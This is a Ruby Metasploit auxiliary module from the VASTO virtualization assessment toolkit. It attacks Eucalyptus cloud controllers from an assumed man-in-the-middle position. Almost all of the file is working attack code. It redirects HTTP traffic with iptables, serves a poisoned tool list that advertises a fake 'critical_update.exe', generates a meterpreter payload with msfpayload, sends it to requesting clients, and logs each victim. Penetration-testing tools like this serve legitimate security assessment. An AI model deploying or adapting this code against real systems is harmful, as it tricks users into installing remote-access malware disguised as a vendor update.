#################################################################
# 								#
#		This module is part of VASTO			#
#			Version 0.4				#
#		Virtualization ASsessment TOolkit		#
#								#
#################################################################

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::TcpServer
	include Msf::Auxiliary::Report
	include Rex::FileUtils
	
	def initialize
		super(
			'Name'        => 'Eucalyptus Poison',
			'Version'     => '0.1',
			'Description'    => %q{
			This module will assume a MITM attack is in place
			against the remote Eucalyptus cloud controller. 
			The module will poison the Extra section of the interface,
			presenting fake tools with the selected payload. This module
			requres root privileges to run.
			},
			'Author'      => ['Claudio Criscione'],
			'License'     => GPL_LICENSE
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "Local port to listen on.", 80 ]),
				OptString.new('PAYLOAD',    [ true, "Payload to run vs the client.", "windows/meterpreter/bind_tcp" ]),
			], self.class)
	end

	def run
		system("sudo iptables -t nat -A OUTPUT -p tcp --destination-port 80 -j DNAT --to 127.0.0.1")
		@myhost   = datastore['SRVHOST']
		@myport   = datastore['SRVPORT']		
		@payload  = datastore['PAYLOAD']
		@LPORT = datastore['LPORT']
		@LHOST = datastore['LHOST']
		@RHOST = datastore['RHOST']
		@vasto_directory = ""
		exploit()
	end
	
	
	def on_client_connect(c)
		c.extend(Rex::Proto::Http::ServerClient)
		c.init_cli(self)
	end
	
	def on_client_data(cli)
		begin
			data = cli.get_once(-1, 5)
			raise ::Errno::ECONNABORTED if !data or data.length == 0
			case cli.request.parse(data)
				when Rex::Proto::Http::Packet::ParseCode::Completed
					dispatch_request(cli, cli.request)
					cli.reset_cli
				when  Rex::Proto::Http::Packet::ParseCode::Error
					close_client(cli)
			end
		rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
		rescue ::OpenSSL::SSL::SSLError
		rescue ::Exception
			print_status("EucaPoison - Error: #{$!.class} #{$!} #{$!.backtrace}")
		end
	
		close_client(cli)
	end

	def close_client(cli)
		cli.close
		# Require to clean up the service properly
		raise ::EOFError
	end
	
	def dispatch_request(cli, req)
		
		#Find vasto directory
		@vasto_directory = "#{Msf::Config.module_directory}/auxiliary/vasto"
		@vasto_directory	= "#{Msf::Config.user_module_directory}/auxiliary/vasto" if(not File.exist?(@vasto_directory))
		p "vasto modules not found!\nMust reside in: #{Msf::Config.module_directory}/auxiliary/vasto\n or: #{Msf::Config.user_module_directory}/auxiliary/vasto" if(not File.exist?(@vasto_directory))
	
		phost = cli.peerhost
		
		mysrc = Rex::Socket.source_address(cli.peerhost)
		hhead = (req['Host'] || @myhost).split(':', 2)[0]
		
		if (req.resource =~ /^http\:\/+([^\/]+)(\/*.*)/)
			req.resource = $2
			hhead, nport = $1.split(":", 2)[0]
			@myport = nport || 80
		end

		#Providing a standard image list - we could poison this one too some day
		#TODO poison images
		if(req.resource == "/downloads/eucalyptus-images/list.php")
			data = 	
				  "http://eucalyptussoftware.com/downloads/eucalyptus-images/euca-centos-5.3-i386.tar.gz	euca-centos-5.3-i386.tar.gz	CentOS 5.3 i386\r\n" +
				  "http://eucalyptussoftware.com/downloads/eucalyptus-images/euca-centos-5.3-x86_64.tar.gz	euca-centos-5.3-x86_64.tar.gz	CentOS 5.3 x86_64\r\n" +
				  "http://eucalyptussoftware.com/downloads/eucalyptus-images/euca-debian-5.0-i386.tar.gz	euca-debian-5.0-i386.tar.gz	Debian 5.0 (lenny) i386\r\n" +
				  "http://eucalyptussoftware.com/downloads/eucalyptus-images/euca-debian-5.0-x86_64.tar.gz	euca-debian-5.0-x86_64.tar.gz	Debian 5.0 (lenny) x86_64\r\n" +
				  "http://eucalyptussoftware.com/downloads/eucalyptus-images/euca-fedora-10-x86_64.tar.gz	euca-fedora-10-x86_64.tar.gz	Fedora 10 x86_64\r\n" +
				  "http://eucalyptussoftware.com/downloads/eucalyptus-images/euca-fedora-11-i386.tar.gz	euca-fedora-11-i386.tar.gz	Fedora 11 i386\r\n" +
				  "http://eucalyptussoftware.com/downloads/eucalyptus-images/euca-ubuntu-9.04-i386.tar.gz	euca-ubuntu-9.04-i386.tar.gz	Ubuntu 9.04 (jaunty) i386\r\n" +
				  "http://eucalyptussoftware.com/downloads/eucalyptus-images/euca-ubuntu-9.04-x86_64.tar.gz	euca-ubuntu-9.04-x86_64.tar.gz	Ubuntu 9.04 (jaunty) x86_64\r\n"

			res  = 
				"HTTP/1.1 200 Ok\r\n" +
				"Host: #{mysrc}\r\n" +
				"Content-Type: binary/octet-string\r\n" +
				"Content-Length: #{data.length}\r\n" +
				"Connection: Close\r\n\r\n#{data}"
			cli.put(res)
			return
		end

		#Here we generate the poisonous list
		if(req.resource == "/downloads/eucalyptus-tools/list.php")
			print_status("EucaPoison - Client #{cli.peerhost} is requesting tool list. Generating evil list.")
			data = 	
				 "http://www.eucalyptussoftware.com/critical_update.exe	critical_update	Critical Update - Install NOW!\r\n" +
				 "http://open.eucalyptus.com/wiki/Euca2oolsGuide	euca2ools	Eucalyptus Client Tools\r\n" +
				 "http://open.eucalyptus.com/wiki/ToolsEcosystem	other clients	Eucalyptus Ecosystem Page\r\n"

			res  = 
				"HTTP/1.1 200 Ok\r\n" +
				"Host: #{mysrc}\r\n" +
				"Content-Type: binary/octet-string\r\n" +
				"Content-Length: #{data.length}\r\n" +
				"Connection: Close\r\n\r\n#{data}"
			cli.put(res)
			return
		end

		
		#Send the malicious payload
		if(req.resource == "/critical_update.exe")
			print_status("EucaPoison - Bingo #{cli.peerhost} is asking for the critical update. Infecting.")
			create_exploit()
			print_status("#{cli.peerhost} uploading exploit")
			data = File.read("#{@vasto_directory}/data/eucapoison.exe")
			res  = 
				"HTTP/1.1 200 Ok\r\n" +
				"Host: #{mysrc}\r\n" +
				"Content-Type: binary/octet-string\r\n" +
				"Content-Length: #{data.length}\r\n" +
				"Connection: Close\r\n\r\n#{data}"
			cli.put(res)
			
			print_status("EucaPoison - Saving session information on DB")
			report_note(
				:type   => 'host.Eucalyptus.poison',
				:data   => {
					:attacker_host	=> @LHOST,
					:attacker_port	=> @LPORT,
					:victim_host	=> cli.peerhost,
					:victim_port	=> @RPORT,
					:payload		=> @payload
				},
				:update => :unique_data
			)
			return
		end	
	end
	
	
	# Creating the exploit with a lame call to msfpayload
	def create_exploit()
		poison_path = "#{@vasto_directory}/data/eucapoison.exe"
		print_status("EucaPoison - Creating payload...")
	    executeme = "#{Msf::Config.install_root}/msfpayload #{@payload} "
	    if @LHOST != nil
		executeme = executeme + "LHOST=#{@LHOST} "	
	    end
	    if @LPORT != nil 
		executeme = executeme + "LPORT=#{@LPORT} "	
	    end
	    if @RPORT != nil
		executeme = executeme + "RPORT = #{@RPORT} "	
	    end
	    executeme = executeme + "X > #{poison_path}"
	    print_status("Executing #{executeme}")

            system(executeme)
	end

	
	
end
